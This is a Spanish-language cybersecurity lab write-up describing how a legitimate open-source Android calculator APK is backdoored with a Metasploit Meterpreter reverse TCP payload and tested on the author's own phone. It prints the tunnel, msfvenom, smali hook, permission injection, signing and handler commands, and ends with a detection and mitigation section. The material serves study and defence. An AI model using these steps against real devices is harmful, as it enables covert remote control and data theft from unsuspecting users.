Android APK Backdoor Injection – Writeup de laboratorio
> **⚠️ Disclaimer:** Este proyecto es una práctica académica de ciberseguridad realizada en un entorno de laboratorio controlado, sobre dispositivos propios y con fines exclusivamente educativos. No se ha comprometido ningún dispositivo de terceros. Reproducir estas técnicas contra sistemas ajenos sin autorización expresa es ilegal.
TL;DR
Se toma una aplicación Android legítima (una calculadora), se le inyecta un payload de Meterpreter mediante ingeniería inversa de su código smali, y se consigue una reverse shell completa contra un Samsung Galaxy S9 con Android 10, todo sin alterar la apariencia ni el funcionamiento visible de la app.
Índice
Objetivo
Entorno de laboratorio
Herramientas utilizadas
Flujo del ataque
Metodología paso a paso
Problemas encontrados y lecciones aprendidas
Detección y mitigación (Blue Team)
Capturas de pantalla
Referencias
Objetivo
Demostrar cómo un atacante puede modificar una app Android legítima para inyectarle una reverse shell, distribuyéndola como si fuera la app original. El objetivo es entender el vector de ataque para poder defenderse de él.
Entorno de laboratorio
Componente	Detalle
Máquina atacante	Kali Linux
Dispositivo víctima	Samsung Galaxy S9 (SM-G960U1), Android 10, One UI 2.5, aarch64
Red	LAN doméstica + túnel TCP público (Pinggy)
App legítima	Simple Calculator v5.10.2 (Simple Mobile Tools) — open source, sin ads
Herramientas utilizadas
Metasploit Framework (`msfvenom` + `msfconsole`) — generación de payload y handler
apktool 3.0.2 — descompilación y recompilación de APKs
keytool + apksigner + zipalign — firma digital del APK modificado
Pinggy — túnel TCP para exponer el listener a internet
SSH (RSA) — autenticación del túnel
Apache2 — distribución del APK vía servidor web local
Flujo del ataque
```
┌──────────────┐     ┌───────────────────┐     ┌──────────────┐
│   Víctima    │────▶│   Pinggy (túnel)  │────▶│ Kali Linux   │
│  Samsung S9  │     │  puerto público   │     │ msfconsole   │
│  Android 10  │     │  :41509           │     │ LPORT :8080  │
└──────────────┘     └───────────────────┘     └──────────────┘
  Abre la app           Reenvía tráfico          Recibe sesión
  calculadora           TCP vía SSH              Meterpreter
```
Metodología paso a paso
1. Reconocimiento del dispositivo
Se identifican las características del Samsung Galaxy S9: Android 10, arquitectura aarch64, One UI 2.5. Estos datos determinan la compatibilidad del APK y del payload.
2. Selección de la app legítima
Se elige Simple Calculator de Simple Mobile Tools (v5.10.2) desde APKMirror. Criterios clave: archivo APK único (no App Bundle), sin dependencias de terceros, código abierto, variante `nodpi`/`noarch`, compatible con API 21-33.
3. Creación del túnel TCP
Se genera un par de claves SSH (RSA) y se establece un túnel con Pinggy para exponer el puerto local 8080 a una dirección pública. El túnel debe permanecer activo durante toda la operación.
```bash
ssh -p 443 -R0:localhost:8080 qr+tcp@free.pinggy.io
```
4. Generación del payload
Se usa `msfvenom` para crear un APK con un Meterpreter reverse TCP apuntando a la dirección y puerto públicos de Pinggy.
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<DIRECCIÓN_PINGGY> LPORT=<PUERTO_PINGGY> -o msf.apk
```
5. Descompilación e inyección
Se descompilan ambos APKs con apktool, obteniendo su código smali. Se copia la carpeta `com/metasploit/stage/` del payload dentro de la estructura smali de la calculadora.
6. Hook en el punto de entrada
Se localiza la `MainActivity` en el `AndroidManifest.xml` y se inyecta la llamada al payload en su método `onCreate`, justo después de `invoke-super`:
```smali
invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
```
Es fundamental usar `invoke-static` (no `invoke-virtual`), ya que el método `start` del payload es estático. Usar `invoke-virtual` provoca un `VerifyError` porque el verificador de bytecode de Android detecta una incompatibilidad de tipos.
7. Inyección de permisos
Se copian los permisos del `AndroidManifest.xml` del payload al de la calculadora: `INTERNET`, `CAMERA`, `RECORD_AUDIO`, `READ_CONTACTS`, `ACCESS_FINE_LOCATION`, `SEND_SMS`, `READ_SMS`, `CALL_PHONE`, entre otros.
8. Recompilación y firma
Se recompila el APK con apktool, se alinea con `zipalign` y se firma con `apksigner`. El orden es importante: primero alinear, después firmar (hacerlo al revés invalida la firma).
```bash
java -jar apktool_3.0.2.jar b calculator -o calculator_mod.apk
zipalign -v 4 calculator_mod.apk calculator_aligned.apk
apksigner sign --ks mi_keystore.keystore --ks-key-alias mi_clave calculator_aligned.apk
```
9. Distribución y explotación
Se sirve el APK desde Apache en la máquina atacante. En paralelo, se configura el handler en `msfconsole`:
```bash
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
exploit
```
Al abrir la calculadora, la víctima ve la app funcionando con normalidad mientras se establece una sesión Meterpreter en segundo plano.
10. Post-explotación
Con la sesión abierta se tiene acceso a: información del sistema (`sysinfo`), listado de apps instaladas (`app_list`), shell del dispositivo, etc. Los permisos sensibles (cámara, micrófono, ubicación) quedan bloqueados por Android 10 al no haber sido autorizados en tiempo de ejecución por el usuario.
Problemas encontrados y lecciones aprendidas
Intento fallido con Angry Birds
Antes de usar la calculadora, se intentó con Angry Birds. Aparecieron tres errores encadenados:
`VerifyError` — Al usar `invoke-virtual` en lugar de `invoke-static`. El verificador de bytecode de Android 10 rechazó la incompatibilidad de tipos.
`IllegalArgumentException` — El servicio de facturación de Google Play exigía un intent explícito (restricción de Android 5.0+).
`SecurityException` — Un SDK publicitario (Burstly) intentaba acceder al IMEI con `getDeviceId()`, bloqueado desde Android 10.
Lección: para este tipo de ejercicios, cuanto más limpia sea la app (sin SDKs de ads, sin compras in-app, sin servicios de Google Play), menos obstáculos aparecen. La calculadora open source fue la elección correcta.
Detección y mitigación (Blue Team)
¿Cómo se detecta y previene este ataque?
No instalar APKs de fuentes no oficiales. Este ataque depende al 100% de que el usuario ignore las advertencias del sistema.
Google Play Protect detecta y avisa de apps no verificadas. Mantenerlo siempre activado.
Revisar los permisos de cada app. Una calculadora que pide acceso a cámara, micrófono y SMS es una señal de alarma inmediata.
Análisis estático con herramientas como `apktool`, `jadx` o `MobSF` para inspeccionar el código antes de instalar.
Verificación de firma: comparar el hash SHA-256 del APK con el publicado por el desarrollador oficial.
Android 6.0+ mitiga parte del impacto: los permisos en tiempo de ejecución impiden el acceso a recursos sensibles sin autorización explícita del usuario.
Soluciones EDR/MDM en entornos corporativos para controlar qué apps se pueden instalar.
Capturas de pantalla
<!-- Las capturas se almacenan en la carpeta /screenshots del repo -->
Paso	Descripción	Imagen
Túnel Pinggy	Establecimiento del túnel TCP	![Túnel Pinggy](screenshots/01_tunel_pinggy.png)
Generación payload	Output de msfvenom	![Payload](screenshots/02_msfvenom_payload.png)
Código smali	Inyección en onCreate	![Smali](screenshots/03_smali_injection.png)
Permisos	Manifest con permisos inyectados	![Permisos](screenshots/04_manifest_permisos.png)
Instalación	App instalándose en el S9	![Instalación](screenshots/05_instalacion_s9.png)
Sesión Meterpreter	Conexión establecida	![Meterpreter](screenshots/06_meterpreter_session.png)
Post-explotación	sysinfo y shell	![Post-explotación](screenshots/07_post_explotacion.png)
> Sustituye los nombres de archivo por los reales de tus capturas.
Referencias
Metasploit Framework
apktool
Pinggy
Simple Calculator – Simple Mobile Tools
OWASP Mobile Security Testing Guide
---
Proyecto académico de ciberseguridad. Uso exclusivamente educativo y en entorno controlado.
